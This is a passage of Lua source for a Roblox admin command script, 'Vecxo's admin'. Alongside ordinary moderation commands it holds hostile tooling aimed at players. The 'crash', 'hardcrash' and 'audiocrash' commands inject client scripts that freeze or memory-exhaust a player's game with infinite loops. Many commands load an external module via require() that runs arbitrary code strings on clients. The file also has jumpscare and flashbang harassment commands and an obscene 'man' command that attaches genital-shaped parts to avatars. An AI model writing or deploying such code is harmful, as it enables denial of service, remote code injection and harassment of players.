		for i,v in ipairs(Tabby:GetDescendants()) do
			if v:IsA("BasePart") then
				if not table.find(tparts, v.CFrame) then
					table.insert(tparts, v.CFrame)
				end
			end
		end

		for i,v in ipairs(_Game:GetDescendants()) do
			if v:IsA("BasePart") then
				if not table.find(gparts, v.CFrame) then
					table.insert(gparts, v.CFrame)
				end
			end
		end

		for i,v in pairs(game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Kah"):GetDescendants()) do
			if v:IsA("BasePart") then
				v.Transparency = 1
			end
		end

		local repair = BackupTabby:Clone()
		local repair2 = BackupGame:Clone()
		repair.Parent = workspace.Tabby
		repair2.Parent = workspace.Terrain

		for i,v in pairs(repair:GetDescendants()) do
			if v:IsA("BasePart") and not table.find(tparts, v.CFrame) then
				v.Transparency = 0
			end
		end

		for i,v in pairs(repair2:GetDescendants()) do
			if v:IsA("BasePart") and not table.find(gparts, v.CFrame) then
				v.Transparency = 0
			end
		end
]]
	end
})

addcmd({
	Name = "savemap",
	Aliases = {"smap"},
	Player = false,
	Function = function(sender, targets, arguments)
		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap") then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap"):Destroy()
		end

		local folder = Instance.new("Folder", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
		folder.Name = "SavedMap"

		for i, v in pairs(workspace:GetChildren()) do
			if v:IsA("BasePart") and v.Name ~= "Terrain" and not game.Players:FindFirstChild(v.Name) then
				v:Clone().Parent = folder
			end
		end

	end
})

addcmd({
	Name = "loadmap",
	Aliases = {"lmap"},
	Player = false,
	Function = function(sender, targets, arguments)
		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap") then
			game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("SavedMap"):Clone().Parent = workspace
		else
			notfi(sender, "Vecxo's admin", "No map has been saved yet! say ".. _G.prefix .."savemap to save one!")
		end
	end
})

addcmd({
	Name = "admin",
	Aliases = {"perm"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(_G.tempadmins, plr.Name) and not table.find(_G.permadmins, plr.Name) then
				table.insert(_G.permadmins, plr.Name)
			elseif not table.find(_G.permadmins, plr.Name) and not table.find(_G.tempadmins, plr.Name) then
				table.insert(_G.permadmins, plr.Name)
				table.insert(_G.tempadmins, plr.Name)
			else
				notfi(sender, "Vecxo's admin", plr.Name .." already has perm admin!")
			end
		end
	end
})

addcmd({
	Name = "unadmin",
	Aliases = {"noperm"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(_G.permadmins, plr.Name) then
				table.remove(_G.permadmins, table.find(_G.permadmins, plr.Name))
			end
			if table.find(_G.tempadmins, plr.Name) then
				table.remove(_G.tempadmins, table.find(_G.tempadmins, plr.Name))
			end
		end
	end
})

addcmd({
	Name = "p299",
	Aliases = {"persons"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not table.find(_G.p299, plr.Name) then
				table.insert(_G.p299, plr.Name)
			else
				notfi(sender, "Vecxo's admin", plr.Name .." already has person299 admin!")
			end
		end
	end
})

addcmd({
	Name = "unp299",
	Aliases = {"unpersons"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(_G.p299, plr.Name) then
				table.remove(_G.p299, table.find(_G.p299, plr.Name))
			else
				notfi(sender, "Vecxo's admin", plr.Name .. " Doesn't have person299!")
			end
		end
	end
})
addcmd({
	Name = "regen",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		for i,v in pairs(_G.tempadmins) do
			if table.find(_G.Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then return end
			table.remove(_G.tempadmins, table.find(_G.tempadmins, v.Name))
		end
	end
})

addcmd({
	Name = "shutdown",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local reason = table.concat(arguments, " ")

		if reason == "" or reason == " " then
			reason = "No reason provided."
		end

		for i,v in pairs(game.Players:GetPlayers()) do
			v:Kick("[SHUTDOWN] by cxo's admin | Reason: ".. reason)
		end
		game.Players.ChildAdded:Connect(function(cxo)
			cxo:Kick("[SHUTDOWN] by cxo's admin | Reason: ".. reason)
		end)
	end
})

addcmd({
	Name = "restart",
	Aliases = {"newserver", "softshutdown"},
	Player = false,
	Function = function(sender, targets, arguments)
		local message = Instance.new("Message", workspace)
		local dots = 0
		local running = true
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo]: Restarting server" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		game.Players.PlayerAdded:Connect(function(v)
			repeat task.wait() until v and v.Character
			v:Kick("[Vecxo's admin]: This server was closed because someone triggered a new server creation.")
		end)

		local teleportService = game:GetService("TeleportService")
		local code = teleportService:ReserveServer(game.PlaceId)

		teleportService:TeleportToPrivateServer(game.PlaceId, code, game.Players:GetPlayers(), nil, {
			softshutdowned = true,
			Vecxo = true
		})
		task.wait(7.5)
		running = false
		message:Destroy()
		for _, v in ipairs(game.Players:GetPlayers()) do
			v:Kick("[Vecxo's admin]: Failed to teleport you to the restarted server. Please rejoin manually.")
		end
	end
})

addcmd({
	Name = "privserver",
	Aliases = {"privateserver"},
	Function = function(sender, targets, arguments)
		local players = {}
		for i, plr in ipairs(targets) do
			table.insert(players, plr)
		end
		game:GetService("TeleportService"):TeleportToPrivateServer(game.PlaceId, game:GetService("TeleportService"):ReserveServer(game.PlaceId), players, nil, { cxo = true })
	end
})

addcmd({
	Name = "publicserver",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local players = {}
		for i, plr in ipairs(targets) do
			table.insert(players, plr)
		end

		local data = Instance.new("TeleportOptions")
		data:SetTeleportData({cxo = true})

		local success, err = pcall(function()
			game:GetService("TeleportService"):TeleportAsync(game.PlaceId, players, data)
		end)

		if not success then
			notfi(sender, "Vecxo's admin", "Teleport failed:", err)
		end
	end
})

addcmd({
	Name = "clyde",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local clyde = Instance.new("ImageLabel", sgui)
			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()

			clyde.Size = UDim2.new(1,0,1.1,0)
			clyde.BackgroundTransparency = 1
			clyde.Image = "rbxassetid://15637324487"
			clyde.ZIndex = 10
			clyde.Visible = true

			sgui.IgnoreGuiInset = true

			jss.Parent = plr.Character
			jss.Enabled = true

			coroutine.wrap(function()
				task.wait(5)
				sgui:Destroy()
			end)()

		end
	end
})

addcmd({
	Name = "jumpscare",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local scary = Instance.new("ImageLabel", sgui)

			scary.Size = UDim2.new(1,0,1.1,0)
			scary.BackgroundTransparency = 1
			scary.Image = "rbxassetid://13825687318"
			scary.ZIndex = 10
			scary.Visible = true

			sgui.IgnoreGuiInset = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://270145703"
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]

			scr.Parent = plr.PlayerGui
			scr.Name = "JumpScareScript"
			scr.Enabled = true

			coroutine.wrap(function()
				task.wait(3.5)
				sgui:Destroy()
			end)()

		end
	end
})

addcmd({
	Name = "flashbang",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local flashbang = Instance.new("Frame", sgui)
			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()

			sgui.IgnoreGuiInset = true

			flashbang.Size = UDim2.new(1, 0, 1, 0)
			flashbang.Position = UDim2.new(0, 0, 0, 0)
			flashbang.BackgroundColor3 = Color3.new(255, 255, 255)
			flashbang.Visible = true

			jss.Parent = plr.Character
			jss.Enabled = true

			coroutine.wrap(function()
				task.wait(5)
				sgui:Destroy()
			end)()
		end
	end
})

addcmd({
	Name = "slenderman",
	Aliases = {"slender"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local sgui = Instance.new("ScreenGui", plr.PlayerGui)
			local slender = Instance.new("ImageLabel", sgui)
			local jss = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("JumpScareScript"):Clone()

			sgui.IgnoreGuiInset = true

			slender.Size = UDim2.new(1, 0, 1, 0)
			slender.Position = UDim2.new(0, 0, 0, 0)
			slender.Image = "http://www.roblox.com/asset/?id=16999373390"
			slender.Visible = true

			jss.Parent = plr.Character
			jss.Enabled = true

			coroutine.wrap(function()
				task.wait(5)
				sgui:Destroy()
			end)()
		end
	end
})

addcmd({
	Name = "banhammer",
	Aliases = {"hammer", "kickhammer", "kh", "bh"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(10468797)
			end)

			if success and gear then
				local banhammer = gear:FindFirstChildOfClass("Tool")
				if banhammer then
					banhammer.Parent = plr.Backpack
				end

				local sound = banhammer:WaitForChild("Handle").Whack

				if not sound then
					local sound = Instance.new("Sound", workspace)
					sound.SoundId = "http://www.roblox.com/asset/?id=10730819"
					sound.Name = "banned"
				end

				banhammer.Handle.Touched:Connect(function(person)

					local playuh = person.Parent
					local playuhn = playuh.Name
					if playuhn == plr.Name then return end
					if playuhn == sender.Name then return end
					if not playuh:FindFirstChild("Humanoid") then return playuh.Parent end
					if not workspace:FindFirstChild("banned") then local sound = Instance.new("Sound", workspace)
						sound.SoundId = "http://www.roblox.com/asset/?id=10730819" 
						sound.Name = "banned" 
					end
					sound.Playing = true
					game.Players:FindFirstChild(playuhn):Kick("You have been struck by the banhammer.")

					banhammered = sound.Ended:Connect(function()
						if sound.Name == "banned" then
							sound:Destroy()
						end
						banhammered:Disconnect()
					end)

				end)
			end
		end
	end
})

addcmd({
	Name = "orb",
	Aliases = {"ff", "forcefield"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then
				local ls = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("OrbScript"):Clone()
				ls.Parent = plr.Character

				repeat task.wait() until ls.Parent == plr.Character

				local orb = Instance.new("Part", plr.Character)
				local weld = Instance.new("Weld", orb)
				local godmode = Instance.new("ForceField", plr.Character)

				ls.Parent = plr.Character
				godmode.Visible = false

				plr.Character.Humanoid.MaxHealth = math.huge
				plr.Character.Humanoid.Health = math.huge

				weld.Part0 = orb
				weld.Part1 = plr.Character:FindFirstChild("Torso")

				orb.Massless = true
				orb.CastShadow = true
				orb.Size = Vector3.new(10, 10, 10)
				orb.Shape = Enum.PartType.Ball
				orb.Transparency = 0.7
				orb.Material = Enum.Material.Neon
				orb.BrickColor = BrickColor.new("Really red")
				orb.Locked = true
				orb.CanCollide = true
				orb.Name = "ff"
			end
		end
	end
})

addcmd({
	Name = "unff",
	Aliases = {"noorb", "noforcefield"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character then
				if plr.Character:FindFirstChild("ff") and plr.Character:FindFirstChildOfClass("ForceField") then
					plr.Character.ff:Destroy()
					plr.Character:FindFirstChildOfClass("ForceField"):Destroy()
				end
			end
		end
	end
})

addcmd({
	Name = "hamsterball", -- punchy gave a better ball so Credit 2 him
	Aliases = {"hamster", "ball"},
	Function = function(sender, targets, arguments)

		if #targets > 1 then
			notfi(sender, "Vecxo's admin", "Too many targets!")
		end

		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("HumanoidRootPart") then

				connected = plr.Character.Humanoid.Died:Connect(function()
					plr.Character:FindFirstChild("hamsterball"):Destroy()
					connected:Disconnect()
				end)

				local folder = Instance.new("Folder", plr.Character)
				folder.Name = "hamsterball"

				local center = Instance.new("Part", folder)
				center.Name = "HamsterBallCenter"
				center.Size = Vector3.new(1, 1, 1)
				center.Transparency = 1
				center.Anchored = false
				center.CanCollide = false
				center.Position = plr.Character.PrimaryPart.Position

				local radius = 5
				local densityTheta = 20
				local densityPhi = 40

				for i = 0, densityTheta do
					local theta = math.pi * (i / densityTheta)
					for j = 0, densityPhi - 1 do
						local phi = 2 * math.pi * (j / densityPhi)

						local x = radius * math.sin(theta) * math.cos(phi)
						local y = radius * math.cos(theta)
						local z = radius * math.sin(theta) * math.sin(phi)

						local part = Instance.new("Part", folder)
						part.Name = "HamsterBall"
						part.Size = Vector3.new(1.37931, 1.37931, 0.2)
						part.Transparency = 0.8
						part.Anchored = false
						part.CanCollide = true
						part.BrickColor = BrickColor.new("Institutional white")
						part.Position = center.Position + Vector3.new(x, y, z)

						local normal = Vector3.new(x, y, z).Unit
						part.CFrame = CFrame.new(part.Position, part.Position + normal)

						local weld = Instance.new("WeldConstraint")
						weld.Part0 = center
						weld.Part1 = part
						weld.Parent = center
					end
				end
				task.wait(0.1)
				plr.Character.PrimaryPart.Position = center.Position
			end
		end
	end
})

addcmd({
	Name = "crash",
	Aliases = {"c"},
	Function = function(sender, targets, arguments)
		local msg = table.concat(arguments, " ")

		if msg and msg ~= "" then

			if msg == " " then
				msg = "cxo's admin | You have been crashed"
			end

			if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg") then

				local sgui = Instance.new("ScreenGui", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
				local f = Instance.new("TextLabel", sgui)

				f.TextScaled = true
				f.Size = UDim2.new(1, 0, 1, 0)
				f.Position = UDim2.new(0, 0, 0, 0)
				f.BackgroundColor3 = Color3.new(0, 0, 0)
				f.Visible = true
				f.TextColor = BrickColor.new("Institutional white")
				f.Font = Enum.Font.SourceSansBold
				sgui.IgnoreGuiInset = true
				sgui.Name = "msg"

			end

			for i, plr in ipairs(targets) do

				local message = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg"):Clone()
				message.TextLabel.Text = msg
				message.Parent = plr.PlayerGui

				task.wait(0.1)

				local crashscript = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Crash"):Clone()
				if plr.PlayerGui then
					crashscript.Parent = plr.PlayerGui
				else
					if plr.Character then
						crashscript.Parent = plr.Character
					end
				end
			end
			return
		end

		for i, plr in ipairs(targets) do
			local crashscript = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Crash"):Clone()
			if plr.PlayerGui then
				crashscript.Parent = plr.PlayerGui
			else
				if plr.Character then
					crashscript.Parent = plr.Character
				end
			end
		end
	end
})

addcmd({
	Name = "hardcrash",
	Aliases = {"memcrash"}, 
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local cxowuhhere = Instance.new("ScreenGui")
			cxowuhhere.ResetOnSpawn = false
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				while true do
					for i = 1, 1000000 do
						local a = Instance.new("Part", workspace)
						a.CFrame = CFrame.new(0, 5, 0)
						--a.Anchored = true
					end
					task.wait()
				end

			]]

			if plr.PlayerGui then
				cxowuhhere.Parent = plr.PlayerGui
				scr.Parent = cxowuhhere
			else
				plr:LoadCharacter()
				repeat task.wait() until plr:FindFirstChild("PlayerGui")
				cxowuhhere.Parent = plr.PlayerGui
				scr.Parent = cxowuhhere
			end

			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "audiocrash",
	Aliases = {"audioc"},
	Function = function(sender, targets, arguments)
		local audio = arguments[1]
		local volume = 1

		for i, plr in ipairs(targets) do

			if audio == "t" then
				audio = "401117743"
			elseif audio == "n" then
				audio = "140555145345310"
				volume = 10
			elseif audio == "s" then
				audio = "7713890963"
				volume = 10
			elseif audio == "p" then
				audio = "4813706721"
				volume = 10
			elseif audio == "m" then
				audio = "90782901177249"
				volume = 10
			elseif arg == "m2" then
				arg = "74220076855302"
				volume = 10
			end

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[
			
			local sound = Instance.new("Sound", workspace)
			sound.SoundId = "rbxassetid://".. %s
			sound.Volume = %s
			sound.Looped = true
			sound.Name = "cxo's admin sound"
			sound:Play()

			repeat task.wait() until sound.TimePosition ~= 0
			while true do end

			]], audio, volume)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end 
	end
})

addcmd({
	Name = "clientsound",
	Aliases = {"clientaudio"},
	Function = function(sender, targets, arguments)
		local audio = arguments[1]
		local volume = 1

		for i, plr in ipairs(targets) do

			if audio == "n" then
				audio = "140555145345310"
			elseif audio == "t" then
				audio = "401117743"
				volume = 10
			elseif audio == "s" then
				audio = "7713890963"
				volume = 10
			elseif audio == "p" then
				audio = "4813706721"
				volume = 10
			elseif audio == "m" then
				audio = "90782901177249"
				volume = 10
			elseif arg == "m2" then
				arg = "74220076855302"
				volume = 10
			end

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[

				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://".. %s
				sound.Volume = %s
				sound.Looped = true
				sound.Name = "cxo's admin client sound"
				sound:Play()

				script:Destroy()

			]], audio, volume)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end 
	end
})

addcmd({
	Name = "unclientsound",
	Aliases = {"unclientaudio"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

				for i,v in pairs(workspace:GetChildren()) do
					if v:IsA("Sound") and v.Name == "cxo's admin client sound" then
						v:Destroy()
					end
				end

				script:Destroy()

			]]

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end 
	end
})

addcmd({
	Name = "clientsoundvolume",
	Aliases = {"clientaudiovolume", "csv", "cav"},
	Function = function(sender, targets, arguments)
		local volume = arguments[1]

		for i, plr in ipairs(targets) do

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[

				for i,v in pairs(workspace:GetChildren()) do
					if v:IsA("Sound") and v.Name == "cxo's admin client sound" then
						v.Volume = %s
					end
				end

				script:Destroy()
				
			]], volume)

			if plr.Character then
				scr.Parent = plr.Character
			else
				scr.Parent = plr:WaitForChild("PlayerGui")
			end

			scr.Enabled = true
		end 
	end
})

addcmd({
	Name = "msg",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local msg = table.concat(arguments, " ")

		if msg then

			if msg == "" then
				notfi(sender, "Vecxo's admin", "Please provide a message! (".. _G.prefix .."msg player message)")
				return
			end

			if msg == " " then
				notfi(sender, "Vecxo's admin", "Please provide a message! (".. _G.prefix .."msg player message)")
				return
			end

			if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg") then

				local sgui = Instance.new("ScreenGui", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
				local f = Instance.new("TextLabel", sgui)

				f.TextScaled = true
				f.Size = UDim2.new(1, 0, 1, 0)
				f.Position = UDim2.new(0, 0, 0, 0)
				f.BackgroundColor3 = Color3.new(0, 0, 0)
				f.Visible = true
				f.TextColor = BrickColor.new("Institutional white")
				f.Font = Enum.Font.SourceSansBold
				sgui.IgnoreGuiInset = true
				sgui.Name = "msg"

			end

			for i, plr in ipairs(targets) do

				local message = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("msg"):Clone()
				message.TextLabel.Text = msg
				message.Parent = plr.PlayerGui

				task.spawn(function()
					task.wait(3.5)
					message:Destroy()
				end)

			end 
		end
	end
})

addcmd({
	Name = "h",
	Aliases = {"hint"},
	Player = false,
	Function = function(sender, targets, arguments)
		local msg = table.concat(arguments, " ")

		if msg then
			local message = Instance.new("Hint", workspace)
			message.Text = msg

			task.spawn(function()
				task.wait(5)
				message:Destroy()
			end)
		end
	end
})

addcmd({
	Name = "m",
	Aliases = {"message"},
	Player = false,
	Function = function(sender, targets, arguments)
		local msg = table.concat(arguments, " ")

		if msg then
			local message = Instance.new("Message", workspace)
			message.Text = msg

			task.spawn(function()
				task.wait(5)
				message:Destroy()
			end)
		end
	end
})

addcmd({
	Name = "system",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local msg = table.concat(arguments, " ")

		if msg then
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr

			if _G.sudo then
				scr:WaitForChild("Exec").Value = string.format([[

					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "%s";
						Color = Color3.new(1, 1, 1);
					})

					script:Destroy()

				]], msg)
			else
				scr:WaitForChild("Exec").Value = string.format([[

					game:GetService("TextChatService"):WaitForChild("TextChannels"):FindFirstChild("RBXGeneral"):DisplaySystemMessage("%s")

					script:Destroy()

				]], msg)
			end

			scr.Enabled = true

			task.wait(0.1) -- otherwise it is 2 fast

			for i,v in pairs(game.Players:GetPlayers()) do
				if v.Character then
					scr:Clone().Parent = v.Character
				else
					scr:Clone().Parent = v:WaitForChild("PlayerGui")
				end
			end
		end
	end
})

addcmd({
	Name = "bend",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Humanoid") then
				plr.Character.HumanoidRootPart.Anchored = true
				plr.Character.Humanoid.Sit = true
				plr.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, 0)
				plr.Character.HumanoidRootPart.Orientation = Vector3.new(-90, plr.Character.HumanoidRootPart.Orientation.Y, plr.Character.HumanoidRootPart.Orientation.Z)
			end
		end
	end
})

addcmd({
	Name = "gmod",
	Aliases = {"gravitygun"},
	Function = function(sender, targets, arguments)

		if #targets > 1 then
			notfi(sender, "Vecxo's admin", "Too many targets!")
		end

		for i, plr in ipairs(targets) do

			if not table.find(gmodded, plr.UserId) then
				table.insert(gmodded, plr.UserId)
			end

			local success, gear = pcall(function()
				return game:GetService("InsertService"):LoadAsset(2136443074)
			end)

			if success and gear then
				local gmod = gear:FindFirstChildOfClass("Tool")
				if gmod then
					gmod.Parent = plr.Backpack
				end
				gmod:WaitForChild("RemoteScript"):Destroy()
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("RemoteScript"):Clone().Parent = gmod
				if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's gmod remote") then
					local gmodremote = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"))
					gmodremote.Name = "cxo's gmod remote"
				end

				lelnobypassforu[plr.UserId] = gmod:WaitForChild("RemoteScript").Destroying:Connect(function()
					if table.find(gmodded, plr.UserId) then
						table.remove(gmodded, table.find(gmodded, plr.UserId))
					end
					lelnobypassforu[plr.UserId]:Disconnect()
				end)

			end
		end
	end
})

addcmd({
	Name = "test",
	Aliases = {},
	Function = function(sender, targets, arguments)
		if sender.UserId ~= 3222470105 then
			notfi(sender, "Vecxo's admin", "This is a test command that is only useable by cxo!")
			return
		end

		for i, plr in ipairs(targets) do
			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("StarterGui"):SetCore("PromptSendFriendRequest", game.Players:FindFirstChild(%s))

			]], sender.Name)

			scr.Enabled = true

			if plr.PlayerGui then
				scr.Parent = plr.PlayerGui
			end
		end


	end
})

addcmd({
	Name = "man",
	Aliases = {"pp", "peep"},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				if plr.Character and plr.Character:FindFirstChild("Torso") then
					local tip = Instance.new("Part", plr.Character)
					local peep = Instance.new("Part", plr.Character)
					local ball1 = Instance.new("Part", plr.Character)
					local ball2 = Instance.new("Part", plr.Character)

					local tipmesh = Instance.new("SpecialMesh", tip)
					local peepmesh = Instance.new("CylinderMesh", peep)
					local ball1mesh = Instance.new("SpecialMesh", ball1)
					local ball2mesh = Instance.new("SpecialMesh", ball2)

					local tipweld = Instance.new("WeldConstraint", plr.Character)
					local peepweld = Instance.new("WeldConstraint", plr.Character)
					local peepweld2 = Instance.new("WeldConstraint", peep)
					local ball1weld = Instance.new("WeldConstraint", plr.Character)
					local ball2weld = Instance.new("WeldConstraint", plr.Character)

					tip.BrickColor = BrickColor.new("Pink")
					tip.Size = Vector3.new(1, 1, 1)
					tip.BottomSurface = "Smooth"
					tip.TopSurface = "Smooth"
					tip.CanCollide = false
					tip.Locked = true

					peep.Color = plr.Character.Torso.Color
					peep.Size = Vector3.new(0.4, 1.3, 0.4)
					peep.BottomSurface = "Smooth"
					peep.TopSurface = "Smooth"
					peep.CanCollide = false
					peep.Locked = true

					ball1.Color = plr.Character.Torso.Color
					ball1.Size = Vector3.new(1, 1, 1)
